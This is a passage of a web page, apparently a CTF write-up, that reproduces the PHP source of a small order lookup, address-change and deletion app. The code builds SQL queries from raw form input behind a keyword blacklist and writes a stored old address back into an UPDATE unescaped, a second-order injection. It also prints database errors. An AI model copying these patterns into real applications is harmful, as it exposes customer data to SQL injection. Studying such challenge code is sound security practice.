&lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;我正是送钱之人&lt;&#x2F;button&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;search.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;; </span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        if(!$row) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;搜索&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;订单查询&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;查询订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt; </span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;    </span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;change.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class=\"line\">        $result &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">        if(!$result) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;修改收货地址&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;h1&gt;修改收货地址&lt;&#x2F;h1&gt;</span><br><span class=\"line\">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class=\"line\">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class=\"line\">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                    &lt;p&gt;</span><br><span class=\"line\">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;修改订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">                    &lt;&#x2F;p&gt;</span><br><span class=\"line\">                &lt;&#x2F;form&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;delete.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &quot;config.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $msg &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class=\"line\">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class=\"line\">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class=\"line\">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class=\"line\">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class=\"line\">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class=\"line\">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class=\"line\">        $result &#x3D; $db-&gt;query(&#39;delete from &#96;user&#96; where &#96;user_id&#96;&#x3D;&#39; . $row[&quot;user_id&quot;]);</span><br><span class=\"line\">        if(!$result) &#123;</span><br><span class=\"line\">            echo &#39;error&#39;;</span><br><span class=\"line\">            print_r($db-&gt;error);</span><br><span class=\"line\">            exit;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $msg &#x3D; &quot;订单删除成功&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class=\"line\">&#125;</span><br><span 